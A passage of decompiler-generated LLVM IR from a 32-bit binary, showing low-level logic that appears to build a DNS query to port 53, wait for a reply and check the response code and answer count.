  %v1_805076b = mul i32 %v3_8050767, 4
  %v2_805076b = add i32 %v1_805076b, 134580856
  %v3_805076b = inttoptr i32 %v2_805076b to i32*
  %v4_805076b = load i32, i32* %v3_805076b, align 4
  %v6_805076b = add i32 %v0_805075f, 4
  %v7_805076b = inttoptr i32 %v6_805076b to i32*
  store i32 %v4_805076b, i32* %v7_805076b, align 4
  %v1_8050772 = add i32 %v0_805075f, 28
  %v2_8050772 = inttoptr i32 %v1_8050772 to i32*
  %v3_8050772 = load i32, i32* %v2_8050772, align 4
  %v6_8050772 = inttoptr i32 %v0_805075f to i32*
  store i32 %v3_8050772, i32* %v6_8050772, align 4
  %v0_8050776 = call i32 @function_8051384()
  store i32 %v0_8050776, i32* %eax.global-to-local, align 4
  %v0_805077b = load i32, i32* @esp, align 4
  %v1_805077b = add i32 %v0_805077b, 16
  br label %dec_label_pc_805077e

dec_label_pc_805077e:                             ; preds = %dec_label_pc_80506e7.dec_label_pc_805077e_crit_edge, %dec_label_pc_805073f, %dec_label_pc_805074b
  %v1_805077e = phi i32 [ %v1_8050735, %dec_label_pc_80506e7.dec_label_pc_805077e_crit_edge ], [ %v1_8050735, %dec_label_pc_805073f ], [ %v1_805077b, %dec_label_pc_805074b ]
  %v0_805077e = phi i32 [ %v0_805077e.pre, %dec_label_pc_80506e7.dec_label_pc_805077e_crit_edge ], [ %v3_8050738, %dec_label_pc_805073f ], [ %v0_8050776, %dec_label_pc_805074b ]
  %v2_805077e = add i32 %v1_805077e, -4
  %v3_805077e = inttoptr i32 %v2_805077e to i32*
  store i32 %v0_805077e, i32* %v3_805077e, align 4
  %v0_805077f = load i32, i32* %eax.global-to-local, align 4
  %v2_805077f = add i32 %v1_805077e, -8
  %v3_805077f = inttoptr i32 %v2_805077f to i32*
  store i32 %v0_805077f, i32* %v3_805077f, align 4
  %v1_8050780 = add i32 %v1_805077e, -12
  %v2_8050780 = inttoptr i32 %v1_8050780 to i32*
  store i32 1, i32* %v2_8050780, align 4
  %v1_8050782 = add i32 %v1_805077e, 184
  store i32 %v1_8050782, i32* @eax, align 4
  %v2_8050789 = add i32 %v1_805077e, -16
  %v3_8050789 = inttoptr i32 %v2_8050789 to i32*
  store i32 %v1_8050782, i32* %v3_8050789, align 4
  %v2_805078a = call i32 @function_804f016(i32 -1, i32 %v15_8050634)
  store i32 %v2_805078a, i32* %eax.global-to-local, align 4
  %v0_805078f = load i32, i32* @esp, align 4
  %v1_805078f = add i32 %v0_805078f, 28
  %v2_805078f = inttoptr i32 %v1_805078f to i32*
  %v3_805078f = load i32, i32* %v2_805078f, align 4
  store i32 %v3_805078f, i32* %eax.global-to-local, align 4
  %v1_8050793 = add i32 %v0_805078f, 260
  %v2_8050793 = inttoptr i32 %v1_8050793 to i32*
  %v3_8050793 = load i32, i32* %v2_8050793, align 4
  store i32 %v3_8050793, i32* @edx, align 4
  %v1_805079a = add i32 %v0_805078f, 224
  %v2_805079a = inttoptr i32 %v1_805079a to i32*
  store i32 1, i32* %v2_805079a, align 4
  %v0_80507a5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80507a5 = load i32, i32* @esp, align 4
  %v2_80507a5 = add i32 %v1_80507a5, 216
  %v3_80507a5 = inttoptr i32 %v2_80507a5 to i32*
  store i32 %v0_80507a5, i32* %v3_80507a5, align 4
  %v1_80507b1 = load i32, i32* @ebx, align 4
  %v2_80507b1 = sub i32 512, %v1_80507b1
  store i32 %v2_80507b1, i32* %eax.global-to-local, align 4
  %v0_80507b3 = load i32, i32* @edx, align 4
  %v1_80507b3 = load i32, i32* @esp, align 4
  %v2_80507b3 = add i32 %v1_80507b3, 220
  %v3_80507b3 = inttoptr i32 %v2_80507b3 to i32*
  store i32 %v0_80507b3, i32* %v3_80507b3, align 4
  %v0_80507ba = load i32, i32* @esp, align 4
  %v0_80507bd = load i32, i32* %eax.global-to-local, align 4
  %v2_80507bd = add i32 %v0_80507ba, 8
  %v3_80507bd = inttoptr i32 %v2_80507bd to i32*
  store i32 %v0_80507bd, i32* %v3_80507bd, align 4
  %v1_80507be = load i32, i32* @ebx, align 4
  %v2_80507be = add i32 %v1_80507be, %v1_80505a6
  %v2_80507c2 = add i32 %v0_80507ba, 4
  %v3_80507c2 = inttoptr i32 %v2_80507c2 to i32*
  store i32 %v2_80507be, i32* %v3_80507c2, align 4
  %v1_80507c3 = add i32 %v0_80507ba, 216
  store i32 %v1_80507c3, i32* @eax, align 4
  %v3_80507ca = inttoptr i32 %v0_80507ba to i32*
  store i32 %v1_80507c3, i32* %v3_80507ca, align 4
  %v0_80507cb = call i32 @function_8051adc()
  store i32 %v0_80507cb, i32* %eax.global-to-local, align 4
  %v0_80507d0 = load i32, i32* @esp, align 4
  %v2_80507d3 = icmp slt i32 %v0_80507cb, 0
  store i32 %v0_80507cb, i32* @esi, align 4
  br i1 %v2_80507d3, label %dec_label_pc_8050c39, label %dec_label_pc_80507dd

dec_label_pc_80507dd:                             ; preds = %dec_label_pc_805077e
  %v1_80507dd = add i32 %v0_80507d0, 172
  %v2_80507dd = inttoptr i32 %v1_80507dd to i16*
  store i16 2, i16* %v2_80507dd, align 2
  %v1_80507e7 = load i32, i32* @esp, align 4
  %v2_80507e7 = add i32 %v1_80507e7, -4
  %v3_80507e7 = inttoptr i32 %v2_80507e7 to i32*
  store i32 %v0_80507cb, i32* %v3_80507e7, align 4
  %v1_80507e8 = add i32 %v1_80507e7, 164
  store i32 %v1_80507e8, i32* %eax.global-to-local, align 4
  %v2_80507ef = add i32 %v1_80507e7, -8
  %v3_80507ef = inttoptr i32 %v2_80507ef to i32*
  store i32 %v1_80507e8, i32* %v3_80507ef, align 4
  %v1_80507f0 = add i32 %v1_80507e7, 32
  %v2_80507f0 = inttoptr i32 %v1_80507f0 to i32*
  %v3_80507f0 = load i32, i32* %v2_80507f0, align 4
  %v5_80507f0 = add i32 %v1_80507e7, -12
  %v6_80507f0 = inttoptr i32 %v5_80507f0 to i32*
  store i32 %v3_80507f0, i32* %v6_80507f0, align 4
  %v1_80507f4 = add i32 %v1_80507e7, -16
  %v2_80507f4 = inttoptr i32 %v1_80507f4 to i32*
  store i32 10, i32* %v2_80507f4, align 4
  %v5_80507f6 = call i32 @function_80514d2(i32 -1, i8* %v4_80507f6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80507f6, i32* %eax.global-to-local, align 4
  %v0_80507fb = load i32, i32* @esp, align 4
  %v1_80507fb = add i32 %v0_80507fb, 16
  %tmp46 = icmp slt i32 %v5_80507f6, 1
  br i1 %tmp46, label %dec_label_pc_805080c, label %dec_label_pc_8050802

dec_label_pc_8050802:                             ; preds = %dec_label_pc_80507dd
  %v1_8050802 = add i32 %v0_80507fb, 172
  %v2_8050802 = inttoptr i32 %v1_8050802 to i16*
  store i16 10, i16* %v2_8050802, align 2
  %v0_805080c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805080c

dec_label_pc_805080c:                             ; preds = %dec_label_pc_80507dd, %dec_label_pc_8050802
  %v0_8050823 = phi i32 [ %v1_80507fb, %dec_label_pc_80507dd ], [ %v0_805080c.pre, %dec_label_pc_8050802 ]
  %v1_805080c = add i32 %v0_8050823, 156
  %v2_805080c = inttoptr i32 %v1_805080c to i16*
  %v3_805080c = load i16, i16* %v2_805080c, align 2
  %v12_805080c = icmp eq i16 %v3_805080c, 10
  %v1_8050815 = icmp eq i1 %v12_805080c, false
  %v1_8050823 = add i32 %v0_8050823, 158
  %v2_8050823 = inttoptr i32 %v1_8050823 to i16*
  store i16 13568, i16* %v2_8050823, align 2
  %v0_805082d = load i32, i32* @esp, align 4
  br i1 %v1_8050815, label %dec_label_pc_8050823, label %dec_label_pc_8050843

dec_label_pc_8050823:                             ; preds = %dec_label_pc_805080c
  %v1_8050830 = add i32 %v0_805082d, 32
  %v2_8050830 = inttoptr i32 %v1_8050830 to i32*
  %v3_8050830 = load i32, i32* %v2_8050830, align 4
  %v5_8050830 = add i32 %v0_805082d, -16
  %v6_8050830 = inttoptr i32 %v5_8050830 to i32*
  store i32 %v3_8050830, i32* %v6_8050830, align 4
  %v1_8050834 = call i32 @function_804d570(i32 -1)
  store i32 %v1_8050834, i32* %eax.global-to-local, align 4
  %v1_8050839 = load i32, i32* @esp, align 4
  %v2_8050839 = add i32 %v1_8050839, 176
  %v3_8050839 = inttoptr i32 %v2_8050839 to i32*
  store i32 %v1_8050834, i32* %v3_8050839, align 4
  %v0_8050840 = load i32, i32* @esp, align 4
  %v1_8050840 = add i32 %v0_8050840, 16
  br label %dec_label_pc_8050843

dec_label_pc_8050843:                             ; preds = %dec_label_pc_805080c, %dec_label_pc_8050823
  %v1_8050843 = phi i32 [ %v1_8050840, %dec_label_pc_8050823 ], [ %v0_805082d, %dec_label_pc_805080c ]
  %v0_8050843 = load i32, i32* @ecx, align 4
  %v2_8050843 = add i32 %v1_8050843, -4
  %v3_8050843 = inttoptr i32 %v2_8050843 to i32*
  store i32 %v0_8050843, i32* %v3_8050843, align 4
  %v1_8050844 = add i32 %v1_8050843, -8
  %v2_8050844 = inttoptr i32 %v1_8050844 to i32*
  store i32 17, i32* %v2_8050844, align 4
  %v1_8050846 = add i32 %v1_8050843, -12
  %v2_8050846 = inttoptr i32 %v1_8050846 to i32*
  store i32 2, i32* %v2_8050846, align 4
  %v1_8050848 = add i32 %v1_8050843, 156
  %v2_8050848 = inttoptr i32 %v1_8050848 to i16*
  %v3_8050848 = load i16, i16* %v2_8050848, align 2
  %v4_8050848 = zext i16 %v3_8050848 to i32
  store i32 %v4_8050848, i32* %eax.global-to-local, align 4
  %v2_8050850 = add i32 %v1_8050843, -16
  %v3_8050850 = inttoptr i32 %v2_8050850 to i32*
  store i32 %v4_8050848, i32* %v3_8050850, align 4
  %v3_8050851 = call i32 @function_804da58(i32 -1, i32 %v15_8050634, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050851, i32* %eax.global-to-local, align 4
  %v1_8050856 = load i32, i32* @esp, align 4
  %v2_8050856 = add i32 %v1_8050856, 36
  %v3_8050856 = inttoptr i32 %v2_8050856 to i32*
  store i32 %v3_8050851, i32* %v3_8050856, align 4
  %v0_805085a = load i32, i32* @esp, align 4
  %v1_805085a = add i32 %v0_805085a, 16
  %v0_805085d = load i32, i32* %eax.global-to-local, align 4
  %v2_805085d = icmp slt i32 %v0_805085d, 0
  br i1 %v2_805085d, label %dec_label_pc_805088a, label %dec_label_pc_8050861

dec_label_pc_8050861:                             ; preds = %dec_label_pc_8050843
  %v1_8050861 = add i32 %v0_805085a, 172
  store i32 %v1_8050861, i32* %eax.global-to-local, align 4
  %v0_8050868 = load i32, i32* @edx, align 4
  %v2_8050868 = add i32 %v0_805085a, 12
  %v3_8050868 = inttoptr i32 %v2_8050868 to i32*
  store i32 %v0_8050868, i32* %v3_8050868, align 4
  %v1_8050869 = add i32 %v0_805085a, 8
  %v2_8050869 = inttoptr i32 %v1_8050869 to i32*
  store i32 28, i32* %v2_8050869, align 4
  %v0_805086b = load i32, i32* %eax.global-to-local, align 4
  %v2_805086b = add i32 %v0_805085a, 4
  %v3_805086b = inttoptr i32 %v2_805086b to i32*
  store i32 %v0_805086b, i32* %v3_805086b, align 4
  %v1_805086c = add i32 %v0_805085a, 36
  %v2_805086c = inttoptr i32 %v1_805086c to i32*
  %v3_805086c = load i32, i32* %v2_805086c, align 4
  %v6_805086c = inttoptr i32 %v0_805085a to i32*
  store i32 %v3_805086c, i32* %v6_805086c, align 4
  %v3_8050870 = call i32 @function_804d954(i32 -1, i32 %v15_8050634, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050870, i32* %eax.global-to-local, align 4
  %v0_8050875 = load i32, i32* @esp, align 4
  %v2_8050878 = icmp slt i32 %v3_8050870, 0
  %v1_805087a = icmp eq i1 %v2_8050878, false
  br i1 %v1_805087a, label %dec_label_pc_8050893, label %dec_label_pc_805087c

dec_label_pc_805087c:                             ; preds = %dec_label_pc_8050861
  %v1_805087c = call i32 @function_804b7f4(i32 -1)
  store i32 %v1_805087c, i32* %eax.global-to-local, align 4
  %v1_8050881 = inttoptr i32 %v1_805087c to i32*
  %v2_8050881 = load i32, i32* %v1_8050881, align 4
  %v11_8050881 = icmp eq i32 %v2_8050881, 101
  %v0_8050bf3.pre = load i32, i32* @esp, align 4
  br i1 %v11_8050881, label %dec_label_pc_8050bf3, label %dec_label_pc_805088a

dec_label_pc_805088a:                             ; preds = %dec_label_pc_805087c, %dec_label_pc_8050843
  %v17_805088a = phi i32 [ %v1_805085a, %dec_label_pc_8050843 ], [ %v0_8050bf3.pre, %dec_label_pc_805087c ]
  %v1_805088a = add i32 %v17_805088a, 28
  %v2_805088a = inttoptr i32 %v1_805088a to i32*
  %v3_805088a = load i32, i32* %v2_805088a, align 4
  %v4_805088a = add i32 %v3_805088a, 1
  store i32 %v4_805088a, i32* %v2_805088a, align 4
  br label %dec_label_pc_8050c14.backedge

dec_label_pc_8050893:                             ; preds = %dec_label_pc_8050861
  %v1_8050893 = add i32 %v0_8050875, 12
  %v2_8050893 = inttoptr i32 %v1_8050893 to i32*
  store i32 0, i32* %v2_8050893, align 4
  %v0_8050895 = load i32, i32* @ebx, align 4
  %v1_8050895 = load i32, i32* @esi, align 4
  %v2_8050895 = add i32 %v1_8050895, %v0_8050895
  store i32 %v2_8050895, i32* %eax.global-to-local, align 4
  %v2_8050898 = add i32 %v0_8050875, 8
  %v3_8050898 = inttoptr i32 %v2_8050898 to i32*
  store i32 %v2_8050895, i32* %v3_8050898, align 4
  %v2_8050899 = add i32 %v0_8050875, 4
  %v3_8050899 = inttoptr i32 %v2_8050899 to i32*
  store i32 %v1_80505a6, i32* %v3_8050899, align 4
  %v1_805089a = add i32 %v0_8050875, 36
  %v2_805089a = inttoptr i32 %v1_805089a to i32*
  %v3_805089a = load i32, i32* %v2_805089a, align 4
  %v6_805089a = inttoptr i32 %v0_8050875 to i32*
  store i32 %v3_805089a, i32* %v6_805089a, align 4
  %v0_805089e = call i32 @function_8050f54()
  store i32 %v0_805089e, i32* %eax.global-to-local, align 4
  %v0_80508a3 = load i32, i32* @esp, align 4
  %v1_80508a3 = add i32 %v0_80508a3, 36
  %v2_80508a3 = inttoptr i32 %v1_80508a3 to i32*
  %v3_80508a3 = load i32, i32* %v2_80508a3, align 4
  store i32 %v3_80508a3, i32* %eax.global-to-local, align 4
  %v1_80508a7 = add i32 %v0_80508a3, 232
  %v2_80508a7 = inttoptr i32 %v1_80508a7 to i16*
  store i16 1, i16* %v2_80508a7, align 2
  %v0_80508b1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80508b1 = load i32, i32* @esp, align 4
  %v2_80508b1 = add i32 %v1_80508b1, 228
  %v3_80508b1 = inttoptr i32 %v2_80508b1 to i32*
  store i32 %v0_80508b1, i32* %v3_80508b1, align 4
  %v0_80508b8 = load i32, i32* @esp, align 4
  %v1_80508bb = add i32 %v0_80508b8, 8
  %v2_80508bb = inttoptr i32 %v1_80508bb to i32*
  store i32 10000, i32* %v2_80508bb, align 4
  %v1_80508c0 = add i32 %v0_80508b8, 4
  %v2_80508c0 = inttoptr i32 %v1_80508c0 to i32*
  store i32 1, i32* %v2_80508c0, align 4
  %v1_80508c2 = add i32 %v0_80508b8, 228
  store i32 %v1_80508c2, i32* %eax.global-to-local, align 4
  %v3_80508c9 = inttoptr i32 %v0_80508b8 to i32*
  store i32 %v1_80508c2, i32* %v3_80508c9, align 4
  %v0_80508ca = call i32 @function_8051068()
  store i32 %v0_80508ca, i32* %eax.global-to-local, align 4
  %v0_80508cf = load i32, i32* @esp, align 4
  %v1_80508cf = add i32 %v0_80508cf, 16
  %tmp47 = icmp slt i32 %v0_80508ca, 1
  br i1 %tmp47, label %dec_label_pc_8050bf3, label %dec_label_pc_80508da

dec_label_pc_80508da:                             ; preds = %dec_label_pc_8050893
  %v1_80508da = add i32 %v0_80508cf, 12
  %v2_80508da = inttoptr i32 %v1_80508da to i32*
  store i32 0, i32* %v2_80508da, align 4
  %v1_80508dc = add i32 %v0_80508cf, 8
  %v2_80508dc = inttoptr i32 %v1_80508dc to i32*
  store i32 512, i32* %v2_80508dc, align 4
  %v2_80508e1 = add i32 %v0_80508cf, 4
  %v3_80508e1 = inttoptr i32 %v2_80508e1 to i32*
  store i32 %v1_80505a6, i32* %v3_80508e1, align 4
  %v1_80508e2 = add i32 %v0_80508cf, 36
  %v2_80508e2 = inttoptr i32 %v1_80508e2 to i32*
  %v3_80508e2 = load i32, i32* %v2_80508e2, align 4
  %v6_80508e2 = inttoptr i32 %v0_80508cf to i32*
  store i32 %v3_80508e2, i32* %v6_80508e2, align 4
  %v4_80508e6 = call i32 @function_804d9a4(i32 -1, i32 %v15_8050634, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80508e6, i32* @eax, align 4
  %v1_80508eb = load i32, i32* @esp, align 4
  %v2_80508eb = add i32 %v1_80508eb, 32
  %v3_80508eb = inttoptr i32 %v2_80508eb to i32*
  store i32 %v4_80508e6, i32* %v3_80508eb, align 4
  %v0_80508ef = load i32, i32* @esp, align 4
  %v1_80508ef = add i32 %v0_80508ef, 16
  %v7_80508f5 = icmp sgt i32 %v4_80508e6, 11
  br i1 %v7_80508f5, label %dec_label_pc_80508fb, label %dec_label_pc_8050ba8

dec_label_pc_80508fb:                             ; preds = %dec_label_pc_80508da
  %v0_80508fb = load i32, i32* @ebx, align 4
  %v2_80508fb = add i32 %v0_80508ef, 12
  %v3_80508fb = inttoptr i32 %v2_80508fb to i32*
  store i32 %v0_80508fb, i32* %v3_80508fb, align 4
  %v0_80508fc = load i32, i32* @ebx, align 4
  %v2_80508fc = add i32 %v0_80508ef, 8
  %v3_80508fc = inttoptr i32 %v2_80508fc to i32*
  store i32 %v0_80508fc, i32* %v3_80508fc, align 4
  %v1_80508fd = add i32 %v0_80508ef, 84
  store i32 %v1_80508fd, i32* %eax.global-to-local, align 4
  %v2_8050901 = add i32 %v0_80508ef, 4
  %v3_8050901 = inttoptr i32 %v2_8050901 to i32*
  store i32 %v1_80508fd, i32* %v3_8050901, align 4
  %v3_8050902 = inttoptr i32 %v0_80508ef to i32*
  store i32 %v1_80505a6, i32* %v3_8050902, align 4
  %v0_8050903 = call i32 @function_8051a30()
  store i32 %v0_8050903, i32* %eax.global-to-local, align 4
  %v0_8050908 = load i32, i32* @esp, align 4
  %v1_8050908 = add i32 %v0_8050908, 84
  %v2_8050908 = inttoptr i32 %v1_8050908 to i32*
  %v3_8050908 = load i32, i32* %v2_8050908, align 4
  store i32 %v3_8050908, i32* %edx.global-to-local, align 4
  %v2_805090c = add i32 %v0_8050908, 60
  %v3_805090c = inttoptr i32 %v2_805090c to i32*
  store i32 %v3_8050908, i32* %v3_805090c, align 4
  %v0_8050910 = load i32, i32* @esp, align 4
  %v1_8050910 = add i32 %v0_8050910, 16
  %v1_8050913 = add i32 %v0_8050910, 72
  %v2_8050913 = inttoptr i32 %v1_8050913 to i32*
  %v3_8050913 = load i32, i32* %v2_8050913, align 4
  store i32 %v3_8050913, i32* @eax, align 4
  %v0_8050917 = load i32, i32* %edx.global-to-local, align 4
  %v12_8050917 = icmp eq i32 %v0_8050917, %v3_8050913
  %v1_8050919 = icmp eq i1 %v12_8050917, false
  br i1 %v1_8050919, label %dec_label_pc_8050ba8, label %dec_label_pc_805091f

dec_label_pc_805091f:                             ; preds = %dec_label_pc_80508fb
  %v1_805091f = add i32 %v0_8050910, 88
  %v2_805091f = inttoptr i32 %v1_805091f to i32*
  %v3_805091f = load i32, i32* %v2_805091f, align 4
  %v4_805091f = icmp eq i32 %v3_805091f, 0
  br i1 %v4_805091f, label %dec_label_pc_8050ba8, label %dec_label_pc_805092a

dec_label_pc_805092a:                             ; preds = %dec_label_pc_805091f
  %v1_805092a = add i32 %v0_8050910, 112
  %v2_805092a = inttoptr i32 %v1_805092a to i32*
  %v3_805092a = load i32, i32* %v2_805092a, align 4
  store i32 %v3_805092a, i32* @eax, align 4
  %v9_805092e = icmp eq i32 %v3_805092a, 3
  %v1_8050931 = icmp eq i1 %v9_805092e, false
  br i1 %v1_8050931, label %dec_label_pc_8050999, label %dec_label_pc_8050933

dec_label_pc_8050933:                             ; preds = %dec_label_pc_805092a
  %v1_8050933 = add i32 %v0_8050910, 67
  %v2_8050933 = inttoptr i32 %v1_8050933 to i8*
  %v3_8050933 = load i8, i8* %v2_8050933, align 1
  %v4_8050933 = icmp eq i8 %v3_8050933, 0
  %v1_8050938 = icmp eq i1 %v4_8050933, false
  br i1 %v1_8050938, label %dec_label_pc_8050989, label %dec_label_pc_805093a

dec_label_pc_805093a:                             ; preds = %dec_label_pc_8050933
  %v0_805093a = load i32, i32* @ecx, align 4
  %v2_805093a = add i32 %v0_8050910, 12
  %v3_805093a = inttoptr i32 %v2_805093a to i32*
  store i32 %v0_805093a, i32* %v3_805093a, align 4
  %v1_805093b = add i32 %v0_8050910, 8
  %v2_805093b = inttoptr i32 %v1_805093b to i32*
  store i32 ptrtoint (i32* @global_var_8055db0.136 to i32), i32* %v2_805093b, align 4
  %v1_8050940 = add i32 %v0_8050910, 4
  %v2_8050940 = inttoptr i32 %v1_8050940 to i32*
  store i32 134541331, i32* %v2_8050940, align 4
  %v1_8050945 = add i32 %v0_8050910, 200
  store i32 %v1_8050945, i32* @esi, align 4
  %v3_805094c = inttoptr i32 %v0_8050910 to i32*
  store i32 %v1_8050945, i32* %v3_805094c, align 4
  %v2_805094d = call i32 @function_804f016(i32 -1, i32 %v15_8050634)
  store i32 %v2_805094d, i32* %eax.global-to-local, align 4
  %v0_8050952 = load i32, i32* @esp, align 4
  %v1_8050952 = inttoptr i32 %v0_8050952 to i32*
  store i32 ptrtoint (i32* @global_var_8055db0.136 to i32), i32* %v1_8050952, align 4
  %v1_8050959 = call i32 @function_804f013(i32 -1)
  store i32 %v1_8050959, i32* %eax.global-to-local, align 4
  %v0_805095e = load i32, i32* @global_var_8058a98.197, align 8
  store i32 %v0_805095e, i32* %ebx.global-to-local, align 4
  %v0_8050964 = load i32, i32* @esp, align 4
  %v1_8050964 = inttoptr i32 %v0_8050964 to i32*
  %v2_8050964 = load i32, i32* %v1_8050964, align 4
  store i32 %v2_8050964, i32* @eax, align 4
  %v3_8050964 = add i32 %v0_8050964, 4
  %v1_8050965 = inttoptr i32 %v3_8050964 to i32*
  %v2_8050965 = load i32, i32* %v1_8050965, align 4
  store i32 %v2_8050965, i32* %edx.global-to-local, align 4
  %v1_8050966 = add i32 %v0_805095e, -1
  store i32 %v1_8050966, i32* @ebx, align 4
  store i32 1, i32* %v1_8050965, align 4
  %v0_8050969 = load i32, i32* @esi, align 4
  store i32 %v0_8050969, i32* %v1_8050964, align 4
  %v2_805096a = call i32 @function_804f016(i32 -1, i32 %v15_8050634)
  store i32 %v2_805096a, i32* %eax.global-to-local, align 4
  %v0_805096f = load i32, i32* @esp, align 4
  %v1_8050972 = add i32 %v0_805096f, 52
  %v2_8050972 = inttoptr i32 %v1_8050972 to i32*
  %v3_8050972 = load i32, i32* %v2_8050972, align 4
  %v4_8050972 = load i32, i32* @ebx, align 4
  %v5_8050972 = sub i32 %v3_8050972, %v4_8050972
  %v11_8050972 = xor i32 %v4_8050972, %v3_8050972
  %v12_8050972 = xor i32 %v5_8050972, %v3_8050972
  %v13_8050972 = and i32 %v12_8050972, %v11_8050972
  %v14_8050972 = icmp slt i32 %v13_8050972, 0
  %v16_8050972 = icmp slt i32 %v5_8050972, 0
  %v2_8050976 = icmp eq i1 %v16_8050972, %v14_8050972
  br i1 %v2_8050976, label %dec_label_pc_8050989, label %dec_label_pc_8050978

dec_label_pc_8050978:                             ; preds = %dec_label_pc_805093a
  %v1_8050978 = add i32 %v0_805096f, 60
  %v2_8050978 = inttoptr i32 %v1_8050978 to i32*
  %v3_8050978 = load i32, i32* %v2_8050978, align 4
  store i32 %v3_8050978, i32* %edx.global-to-local, align 4
  %v3_805097c = load i32, i32* %v2_8050972, align 4
  %v4_805097c = add i32 %v3_805097c, 1
  store i32 %v4_805097c, i32* %v2_8050972, align 4
  %v0_8050980 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050980 = load i32, i32* @esp, align 4
  %v2_8050980 = add i32 %v1_8050980, 56
  %v3_8050980 = inttoptr i32 %v2_8050980 to i32*
  store i32 %v0_8050980, i32* %v3_8050980, align 4
  br label %dec_label_pc_8050c14.backedge

dec_label_pc_8050989:                             ; preds = %dec_label_pc_805093a, %dec_label_pc_8050933
  %v0_8050989 = call i32 @function_804f828()
  store i32 %v0_8050989, i32* %eax.global-to-local, align 4
  %v1_805098e = inttoptr i32 %v0_8050989 to i32*
  store i32 1, i32* %v1_805098e, align 4
  br label %dec_label_pc_8050c4c

dec_label_pc_8050999:                             ; preds = %dec_label_pc_805092a
  %v1_8050999 = icmp eq i32 %v3_805092a, 0
  %v1_805099b = icmp eq i1 %v1_8050999, false
  br i1 %v1_805099b, label %dec_label_pc_8050ba8, label %dec_label_pc_80509a1

dec_label_pc_80509a1:                             ; preds = %dec_label_pc_8050999
  %v1_80509a1 = add i32 %v0_8050910, 120
  %v2_80509a1 = inttoptr i32 %v1_80509a1 to i32*
  %v3_80509a1 = load i32, i32* %v2_80509a1, align 4
  %tmp48 = icmp slt i32 %v3_80509a1, 1
  br i1 %tmp48, label %dec_label_pc_80509b1, label %dec_label_pc_80509a8

dec_label_pc_80509a8:                             ; preds = %dec_label_pc_80509a1
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_80509d054 = add i32 %v0_8050910, 116
  %v3_80509d055 = inttoptr i32 %v2_80509d054 to i32*
  %v4_80509d056 = load i32, i32* %v3_80509d055, align 4
  %v5_80509d057 = sub i32 0, %v4_80509d056
  %v13_80509d061 = and i32 %v4_80509d056, %v5_80509d057
  %v14_80509d062 = icmp slt i32 %v13_80509d061, 0
  %v16_80509d064 = icmp slt i32 %v5_80509d057, 0
  %v2_80509d465 = icmp eq i1 %v16_80509d064, %v14_80509d062
  br i1 %v2_80509d465, label %dec_label_pc_80509d6, label %dec_label_pc_80509c1

dec_label_pc_80509b1:                             ; preds = %dec_label_pc_80509a1
  %v0_80509b1 = call i32 @function_804f828()
  store i32 %v0_80509b1, i32* %eax.global-to-local, align 4
  %v1_80509b6 = inttoptr i32 %v0_80509b1 to i32*
  store i32 4, i32* %v1_80509b6, align 4
  br label %dec_label_pc_8050c4c

dec_label_pc_80509c1:                             ; preds = %dec_label_pc_80509a8, %dec_label_pc_80509c1
  %v0_80509d867 = phi i32 [ %v1_80509cb, %dec_label_pc_80509c1 ], [ %v1_8050910, %dec_label_pc_80509a8 ]
  %v0_80509c166 = phi i32 [ %v0_80509c6, %dec_label_pc_80509c1 ], [ %v3_805092a, %dec_label_pc_80509a8 ]
  %v2_80509c1 = add i32 %v0_80509d867, -4
  %v3_80509c1 = inttoptr i32 %v2_80509c1 to i32*
  store i32 %v0_80509c166, i32* %v3_80509c1, align 4
  %v0_80509c2 = load i32, i32* @ebx, align 4
  %v1_80509c2 = add i32 %v0_80509c2, 1
  store i32 %v1_80509c2, i32* @ebx, align 4
  %v0_80509c3 = load i32, i32* @eax, align 4
  %v2_80509c3 = add i32 %v0_80509d867, -8
  %v3_80509c3 = inttoptr i32 %v2_80509c3 to i32*
  store i32 %v0_80509c3, i32* %v3_80509c3, align 4
  %v0_80509c4 = load i32, i32* @esi, align 4
  %v2_80509c4 = add i32 %v0_80509d867, -12
  %v3_80509c4 = inttoptr i32 %v2_80509c4 to i32*
  store i32 %v0_80509c4, i32* %v3_80509c4, align 4
  %v2_80509c5 = add i32 %v0_80509d867, -16
  %v3_80509c5 = inttoptr i32 %v2_80509c5 to i32*
  store i32 %v1_80505a6, i32* %v3_80509c5, align 4
  %v0_80509c6 = call i32 @function_8051b30()
  store i32 %v0_80509c6, i32* @eax, align 4
  %v0_80509cb = load i32, i32* @esp, align 4
  %v1_80509cb = add i32 %v0_80509cb, 16
  %v0_80509ce = load i32, i32* @esi, align 4
  %v2_80509ce = add i32 %v0_80509ce, %v0_80509c6
  %v0_80509d0.pre = load i32, i32* @ebx, align 4
  store i32 %v2_80509ce, i32* @esi, align 4
  %v2_80509d0 = add i32 %v0_80509cb, 116
  %v3_80509d0 = inttoptr i32 %v2_80509d0 to i32*
  %v4_80509d0 = load i32, i32* %v3_80509d0, align 4
  %v5_80509d0 = sub i32 %v0_80509d0.pre, %v4_80509d0
  %v11_80509d0 = xor i32 %v4_80509d0, %v0_80509d0.pre
  %v12_80509d0 = xor i32 %v5_80509d0, %v0_80509d0.pre
  %v13_80509d0 = and i32 %v12_80509d0, %v11_80509d0
  %v14_80509d0 = icmp slt i32 %v13_80509d0, 0
  %v16_80509d0 = icmp slt i32 %v5_80509d0, 0
  %v2_80509d4 = icmp eq i1 %v16_80509d0, %v14_80509d0
  br i1 %v2_80509d4, label %dec_label_pc_80509d6, label %dec_label_pc_80509c1

dec_label_pc_80509d6:                             ; preds = %dec_label_pc_80509c1, %dec_label_pc_80509a8
  %v0_80509d8.lcssa = phi i32 [ %v1_8050910, %dec_label_pc_80509a8 ], [ %v1_80509cb, %dec_label_pc_80509c1 ]
  store i32 0, i32* @ebx, align 4
  %v1_80509d8 = add i32 %v0_80509d8.lcssa, 27
  %v2_80509d8 = inttoptr i32 %v1_80509d8 to i8*
  store i8 1, i8* %v2_80509d8, align 1
  %v0_8050b06.pre = load i32, i32* @ebx, align 4
  %v1_8050b06.pre = load i32, i32* @esp, align 4
  %v2_8050b0668 = add i32 %v1_8050b06.pre, 104
  %v3_8050b0669 = inttoptr i32 %v2_8050b0668 to i32*
